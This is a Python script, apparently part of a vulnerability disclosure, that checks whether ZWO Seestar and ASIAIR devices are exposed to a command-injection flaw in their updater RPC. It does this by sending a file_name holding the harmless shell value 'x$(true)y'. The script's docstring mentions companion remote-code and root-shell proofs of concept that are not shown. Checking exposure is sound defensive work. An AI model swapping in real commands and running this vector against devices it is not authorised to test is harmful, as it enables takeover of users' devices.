#!/usr/bin/env python3
"""
Non-destructive verification of the vulnerability.

Works on every ZWO product that ships the zwoair_updater daemon:
  * Seestar family (S30/S30P/S50)                   — file port 4361
  * ASIAIR family  (Mini/Plus/Pro)                  — file port 4360
  * ASI cameras with built-in ASIAIR (ASI2600MC Air etc.) — file port 4360

This script does NOT modify the device. It only:
  1. Connects to the updater RPC on TCP/4350.
  2. Sends a begin_recv with a benign file_name that contains $() syntax.
  3. Reports whether the device returned `code:0` (vulnerable: the RPC
     accepted shell-metacharacter content) versus an explicit reject.

It complements poc_rce.py / poc_root_shell.py: useful when the operator
wants to confirm exposure without touching the device's state.
"""
import argparse
import json
import socket


DEVICE_FILE_PORT = {"asiair": 4360, "seestar": 4361}


def resolve_file_port(host, device):
    if device != "auto":
        return DEVICE_FILE_PORT[device]
    for label, port in DEVICE_FILE_PORT.items():
        s = socket.socket()
        s.settimeout(2)
        try:
            s.connect((host, port))
            s.close()
            print(f"[*] auto-detect: file port {port} open → device looks like {label}")
            return port
        except OSError:
            continue
    return None


def main():
    ap = argparse.ArgumentParser(
        description="Non-destructive vulnerability check for the ZWO "
                    "zwoair_updater command-injection bug.",
    )
    ap.add_argument("host")
    ap.add_argument("--device", choices=("auto", "seestar", "asiair"), default="auto",
                    help="which product (default: auto-detect by probing 4360/4361)")
    args = ap.parse_args()

    bp = resolve_file_port(args.host, args.device)
    if bp is None:
        print("[!] neither 4360 nor 4361 listening — host may not be vulnerable from this network segment")
        return
    print(f"[*] binary file channel: {bp}")

    s_bin = socket.socket(); s_bin.settimeout(3); s_bin.connect((args.host, bp))
    s = socket.socket(); s.settimeout(3); s.connect((args.host, 4350))
    banner = s.recv(4096).decode(errors='replace').strip()
    print(f"[*] banner: {banner}")

    benign_payload = "x$(true)y"  # `true` is a no-op shell builtin
    rpc = {"id": 1, "method": "begin_recv",
           "params": [{"file_len": 4, "file_name": benign_payload,
                       "run_update": False,
                       "md5": "00000000000000000000000000000000"}]}
    s.sendall((json.dumps(rpc) + "\r\n").encode())
    resp = s.recv(4096).decode(errors='replace').strip()
    print(f"[*] response to shell-metachar file_name: {resp}")

    if '"code":0' in resp:
        print("[!] VULNERABLE: server accepted file_name containing $() — "
              "the bytes will be interpolated into a shell command at md5 "
              "verification time.")
    elif "method not found" in resp:
        print("[+] begin_recv method missing — likely patched or different firmware.")
    elif "invalid" in resp.lower() or "reject" in resp.lower():
        print("[+] file_name was rejected — possible fix in place.")
    else:
        print("[?] unclear — manual review needed.")

    s.close(); s_bin.close()


if __name__ == "__main__":
    main()
